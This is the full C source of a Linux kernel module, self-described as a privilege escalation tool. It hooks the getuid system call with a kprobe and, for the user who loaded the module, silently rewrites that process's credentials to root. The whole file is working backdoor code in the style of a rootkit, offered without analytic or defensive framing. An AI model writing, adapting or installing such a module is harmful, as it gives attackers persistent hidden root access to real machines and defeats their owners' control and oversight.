#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/kprobes.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Marx");
MODULE_DESCRIPTION("Hooking getuid to do a PrivEsc using Kprobe");
MODULE_VERSION("1");

void set_root(void);

// Hooking the getuid syscall by using Kprobe
static struct kprobe kp = { .symbol_name = "__x64_sys_getuid", };
static uid_t allowed_uid = -1; // Made to only have the allowed UID able to privesc to not break system

// Pre-handler: runs before the probed instruction
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    printk(KERN_INFO "Privesc: handler_pre triggered by %s (PID: %d, UID: %d)\n", 
        current->comm, current->pid, current_uid().val);

    if (current_uid().val == allowed_uid) {
        printk(KERN_INFO "Privesc: UID %d matches allowed_uid. Escalating privileges...\n", allowed_uid);
        set_root();
    } else {
        printk(KERN_INFO "Privesc: UID %d does not match allowed_uid %d. Skipping escalation.\n",
            current_uid().val, allowed_uid);
    }

    return 0;
}

void set_root(void)
{
    struct cred *root;

    printk(KERN_INFO "Privesc: Preparing credentials for privilege escalation...\n");
    root = prepare_creds();
    if (root == NULL) {
        printk(KERN_ERR "Privesc: Failed to prepare credentials\n");
        return;
    }

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    printk(KERN_INFO "Privesc: Committing credentials as root...\n");
    commit_creds(root);
    printk(KERN_INFO "Privesc: Privilege escalation successful\n");
}

static int __init privesc_init(void)
{
    int ret;

    allowed_uid = current_uid().val; // Get the current user's UID when module is loaded
    printk(KERN_INFO "Privesc: Module loaded by %s (PID: %d, UID: %d)\n", 
        current->comm, current->pid, allowed_uid);

    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "Privesc: Failed to register kprobe, returned %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "Privesc: Kprobe registered at %s\n", kp.symbol_name);
    return 0;
}

static void __exit privesc_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "Privesc: Kprobe unregistered\n");
    printk(KERN_INFO "Privesc: Module unloaded\n");
}

module_init(privesc_init);
module_exit(privesc_exit);
